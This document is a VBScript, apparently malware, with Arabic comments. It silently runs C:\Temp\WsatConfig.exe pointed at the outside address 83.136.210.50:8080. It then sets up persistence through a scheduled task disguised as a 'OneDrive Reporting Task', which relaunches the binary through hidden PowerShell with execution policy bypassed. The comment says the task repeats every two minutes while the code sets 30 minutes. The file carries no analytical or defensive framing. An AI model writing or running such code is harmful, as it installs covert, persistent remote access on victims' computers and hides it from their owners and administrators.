Option Explicit

Dim service, rootFolder, taskDefinition, trigger, action, repetition
Dim shell

' تشغيل البرنامج فوراً (مرة واحدة)
Set shell = CreateObject("WScript.Shell")
shell.Run "C:\Temp\WsatConfig.exe 83.136.210.50 8080", 0, False

' إنشاء المهمة المجدولة
Set service = CreateObject("Schedule.Service")
Call service.Connect()

Set rootFolder = service.GetFolder("\")

Set taskDefinition = service.NewTask(0)

taskDefinition.RegistrationInfo.Description = "تشغيل التحديث تلقائياً كل دقيقتين"
taskDefinition.Settings.Enabled = True

Set trigger = taskDefinition.Triggers.Create(1) 
trigger.StartBoundary = "2026-01-01T00:00:00" 
trigger.Enabled = True

Set repetition = trigger.Repetition
repetition.Interval = "PT30M" 

Set action = taskDefinition.Actions.Create(0) 
' استخدام PowerShell مباشرة
action.Path = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
action.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -Command ""Start-Process -FilePath 'C:\Temp\WsatConfig.exe' -ArgumentList '83.136.210.50 8080' -WindowStyle Hidden"""

Call rootFolder.RegisterTaskDefinition("OneDrive Reporting Task-S-1-5-21-2047949552-857980807", taskDefinition, 6, , , 3)

